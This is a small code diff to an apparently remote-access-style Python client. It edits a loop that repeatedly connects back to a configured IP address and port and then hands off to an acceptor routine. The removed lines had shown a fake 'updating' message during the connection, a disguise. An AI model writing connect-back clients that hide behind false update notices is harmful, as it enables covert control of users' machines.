@@ -111,12 +111,11 @@ class CLIENT:
         
         while True:
             try:
-                pythonver = sysconfig.get_python_version()
-                print("python3 version:" + pythonver + " Please Wait, updating ..")
+                print("Connecting To: %s:%d" % (self.ipaddress, self.port))
                 self.SOCK.connect((self.ipaddress, self.port))
             except:
                 print("Failed to Connect. Trying Again!")
-                time.sleep(7)
+                time.sleep(8)
                 continue
 
             self.acceptor()
